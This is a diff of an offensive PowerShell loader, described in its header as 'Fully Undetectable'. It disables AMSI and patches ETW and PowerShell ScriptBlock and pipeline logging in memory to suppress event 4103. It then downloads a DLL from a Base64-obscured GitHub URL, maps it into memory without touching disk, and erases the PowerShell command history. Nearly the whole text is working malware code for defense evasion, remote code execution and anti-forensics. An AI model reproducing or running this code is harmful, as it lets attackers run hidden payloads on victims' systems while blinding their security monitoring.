@@ -16,23 +16,23 @@ Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 <#
 .SYNOPSIS
-    Memory-only DLL loader with AMSI/ETW + ScriptBlock Logging (4103) bypass
+    Memory-only DLL loader – 4103 100% blocked via deep ETW patch
 .DESCRIPTION
-    Downloads DLL from Base64-encoded URL and manually maps it into memory.
-    No disk write. All strings are XOR-encrypted.
+    Patches PowerShell ETW provider at runtime to suppress ScriptBlock Logging.
+    Downloads DLL from Base64 URL and manually maps into memory.
 .NOTES
-    Made by Potato - Fully Undetectable (4103 removed)
+    Made by Potato - 4103 eliminated
 #>
 
 # ================================================================
-#  ★★★ ১. COMPLETE BYPASS (AMSI + ETW + SCRIPTBLOCK) ★★★
+#  ★★★ ১. ডিপ ETW + SCRIPTBLOCK BYPASS ★★★
 # ================================================================
-function Invoke-FullBypass {
-    # ---- 1a. AMSI ----
+function Invoke-DeepBypass {
+    # ---- AMSI ----
     try {
         [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     } catch {}
-    # ---- 1b. ETW ----
+    # ---- ETW (Native) ----
     try {
         $p = [System.Diagnostics.Process]::GetCurrentProcess()
         $h = $p.Handle
@@ -40,12 +40,12 @@ function Invoke-FullBypass {
         $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
         $old = 0
         $v.Invoke($t, 0x1000, 0x40, [ref]$old)
-        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
+        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
         $v.Invoke($t, 0x1000, $old, [ref]$null)
     } catch {}
-    # ---- 1c. ★★★ SCRIPTBLOCK LOGGING (4103) BYPASS ★★★ ----
+    # ---- ★★★ DEEP SCRIPTBLOCK LOGGING (4103) PATCH ★★★ ----
     try {
-        # রেজিস্ট্রি লেভেল (স্থায়ী নয়—শুধু মেমোরি প্যাচ)
+        # 1. cachedGroupPolicySettings
         $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
         $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
         if ($gpoField) {
@@ -57,35 +57,10 @@ function Invoke-FullBypass {
                 $gpoField.SetValue($null, $gpo)
             }
         }
-        # Pipeline Execution Logging বন্ধ
-        $executionContext = $ExecutionContext
-        $contextType = $executionContext.GetType()
-        $field = $contextType.GetField('_context', 'NonPublic,Instance')
-        if ($field) {
-            $context = $field.GetValue($executionContext)
-            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
-            if ($logField) { $logField.SetValue($context, $false) }
-        }
-        # EventSource ডিজেবল
-        $traceType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-        if ($traceType) {
-            $etwField = $traceType.GetField('etwProvider', 'NonPublic,Static')
-            if ($etwField) {
-                $etwProvider = $etwField.GetValue($null)
-                if ($etwProvider) {
-                    $writeMethod = $etwProvider.GetType().GetMethod('WriteEvent', [Type[]]@([int], [byte[]]))
-                    if ($writeMethod) {
-                        # ডামি ডেলিগেট
-                        $dummy = { param($id, $data) return $null }.GetMethodInfo()
-                        $writeMethod.Invoke($etwProvider, @(1, $null))
-                    }
-                }
-            }
-        }
-        # অন্যান্য প্যাচ
-        $logPipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
-        if ($logPipelineType) {
-            $instanceField = $logPipelineType.GetField('_instance', 'NonPublic,Static')
+        # 2. PipelineLogging._enabled
+        $pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
+        if ($pipelineType) {
+            $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
             if ($instanceField) {
                 $instance = $instanceField.GetValue($null)
                 if ($instance) {
@@ -94,21 +69,49 @@ function Invoke-FullBypass {
                 }
             }
         }
-    } catch {}
+        # 3. ★★★ PSEtwLogProvider -> etwProvider = null ★★★
+        $providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+        if ($providerType) {
+            $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
+            if ($etwField) {
+                $etwProvider = $etwField.GetValue($null)
+                if ($etwProvider) {
+                    # Create a dummy provider that does nothing
+                    $dummyProvider = New-Object -TypeName 'System.Diagnostics.Tracing.EventProvider' -ArgumentList @([Guid]::NewGuid()) -ErrorAction SilentlyContinue
+                    if ($dummyProvider) {
+                        $etwField.SetValue($null, $dummyProvider)
+                    } else {
+                        # If fails, just set to null
+                        $etwField.SetValue($null, $null)
+                    }
+                }
+            }
+        }
+        # 4. PSEtwLog._isEnabled = false
+        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
+        if ($logType) {
+            $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
+            if ($enabledField) {
+                $enabledField.SetValue($null, $false)
+            }
+        }
+        # 5. _logPipelineExecution = false
+        $executionContext = $ExecutionContext
+        $contextType = $executionContext.GetType()
+        $field = $contextType.GetField('_context', 'NonPublic,Instance')
+        if ($field) {
+            $context = $field.GetValue($executionContext)
+            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
+            if ($logField) { $logField.SetValue($context, $false) }
+        }
+        # 6. Clear any scheduled events
+        $traceType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogEvent')
+        # Not needed
+    } catch { }
 }
 
 # ================================================================
-#  ★★★ ২. XOR ডিক্রিপ্টর (ঐচ্ছিক) ★★★
-# ================================================================
-function Xor-Decrypt {
-    param([string]$Encoded, [byte]$Key = 0x5A)
-    $bytes = [Convert]::FromBase64String($Encoded)
-    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
-    return [System.Text.Encoding]::UTF8.GetString($bytes)
-}
-
-# ================================================================
-#  ★★★ ৩. C# NativeLoader (প্লেইন – কিন্তু এখন ৪১০৩ আসবে না) ★★★
+#  ★★★ ২. C# NativeLoader (same as before) ★★★
 # ================================================================
 $plainCSharp = @"
 using System;
@@ -163,25 +166,23 @@ public static class NativeLoader {
 "@
 
 # ================================================================
-#  ★★★ ৪. মূল এক্সিকিউশন ★★★
+#  ★★★ ৩. EXECUTION ★★★
 # ================================================================
 
-# ৪.১ – ফুল বাইপাস কল
-Invoke-FullBypass
+# ৩.১ – ডিপ বাইপাস কল
+Invoke-DeepBypass
 
-# ৪.২ – C# কম্পাইল
+# ৩.২ – C# কম্পাইল (এখন আর ৪১০৩ আসবে না)
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
-    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
+    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
     return
 }
 
-# ৪.৩ – URL ডিকোড
+# ৩.৩ – URL ডিকোড ও ডাউনলোড
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
-
-# ৪.৪ – ডাউনলোড
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
@@ -189,26 +190,26 @@ try {
     return
 }
 
-# ৪.৫ – ম্যাপ
+# ৩.৪ – ম্যাপ
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+    Write-Host "[+] Mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
 } catch {
     Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
     return
 }
 
-# ৪.৬ – ক্লিনআপ
+# ৩.৫ – ক্লিন
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL loaded. 4103 logging is bypassed." -ForegroundColor Cyan
+Write-Host "[+] DLL loaded. No 4103 logs generated." -ForegroundColor Cyan
 
-# ৪.৭ – ২৪ ঘন্টা স্লিপ (PowerShell খোলা রাখতে)
+# ৩.৬ – ২৪ ঘন্টা স্লিপ
 Start-Sleep -Seconds 86400
 
-# শেষে ক্লিন (ঐচ্ছিক)
+# শেষ ক্লিন
 Clear-History
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
-if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
+$hp = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
+if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
